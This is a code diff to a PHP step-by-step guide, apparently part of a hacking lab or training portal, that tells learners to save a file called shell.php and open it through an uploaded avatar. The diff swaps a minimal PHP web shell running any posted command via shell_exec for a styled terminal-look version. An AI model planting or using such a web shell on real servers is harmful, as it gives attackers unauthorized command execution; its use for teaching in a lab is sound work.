@@ -42,7 +42,28 @@ $GUIDE = [
 ['t' => 'Write a web shell',
  'b' => '<p>Make a file on your own computer called <code>shell.php</code> holding exactly this. It is a command box, not a URL trick: whatever you type into it runs on the server, and the output prints right there on the page.</p>',
  'try' => [
-     'shell.php' => '<?php if(preg_match(\'#^/i/([a-f0-9]{10})/#\',$_SERVER["SCRIPT_NAME"],$m))setcookie("ss_sid",$m[1],time()+604800,"/");if(isset($_POST["c"])){echo "<pre>".htmlspecialchars(shell_exec($_POST["c"])??"")."</pre>";}?><body style=background:#fff;font-family:monospace;padding:16px><form method=post><input name=c style=width:95% autofocus><button>Run</button></form>',
+     'shell.php' => '<?php
+if(preg_match("#^/i/([a-f0-9]{10})/#",$_SERVER["SCRIPT_NAME"],$m))setcookie("ss_sid",$m[1],time()+604800,"/");
+if(isset($_POST["c"])){$o=shell_exec($_POST["c"])??"";}
+?><!DOCTYPE html><html><head><title>shell</title><style>
+body{background:#0c0c0c;color:#33ff66;font-family:ui-monospace,Menlo,Consolas,monospace;margin:0;padding:24px}
+.term{max-width:860px;margin:40px auto;border:1px solid #1a3a1a;border-radius:8px;box-shadow:0 0 30px rgba(51,255,102,.08);overflow:hidden}
+.bar{background:#111;padding:8px 12px;border-bottom:1px solid #1a3a1a;display:flex;align-items:center;gap:6px}
+.dot{width:10px;height:10px;border-radius:50%}
+.r{background:#ff5f56}.y{background:#ffbd2e}.g{background:#27c93f}
+.title{color:#5a6a5a;font-size:12px;margin-left:8px}
+pre{margin:0;padding:16px;white-space:pre-wrap;word-break:break-all;min-height:220px;max-height:60vh;overflow:auto}
+.hist{color:#5a6a5a}
+form{display:flex;align-items:center;gap:8px;border-top:1px solid #1a3a1a;padding:12px 16px}
+.p{color:#33ff66}
+input{flex:1;background:transparent;border:0;outline:0;color:#33ff66;font:inherit}
+</style></head><body>
+<div class=term>
+<div class=bar><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class=title>root@portal</span></div>
+<pre><?php if(isset($o)){echo "<span class=hist>$ ".htmlspecialchars($_POST["c"])."</span>\n".htmlspecialchars($o);}else{echo "<span class=hist>connected.</span>";}?></pre>
+<form method=post><span class=p>$</span><input name=c autofocus autocomplete=off></form>
+</div>
+</body></html>',
      '--1' => '<strong>Windows:</strong> Notepad, then Save as, and set <em>Save as type</em> to <em>All files</em> so it does not become shell.php.txt.',
      '--2' => '<strong>Mac:</strong> TextEdit, then Format &rarr; Make Plain Text before you save.',
      '--3' => '<strong>Linux or a terminal:</strong> <code>nano shell.php</code>, paste, <strong>Ctrl+O</strong> then <strong>Enter</strong> to save, <strong>Ctrl+X</strong> to leave.',
@@ -57,7 +78,7 @@ $GUIDE = [
 
 ['t' => 'Open it',
  'b' => '<p>Click the broken avatar image. It opens your shell in a new tab - same browser, same cookies, so you never have to retype or paste a URL by hand.</p>',
- 'see' => 'A plain white page with one text box and a Run button. That box is now the only thing standing between you and the server.',
+ 'see' => 'A dark terminal window with a <code>$</code> prompt. That box is now the only thing standing between you and the server.',
 ],
 
 ['t' => 'Run a command',
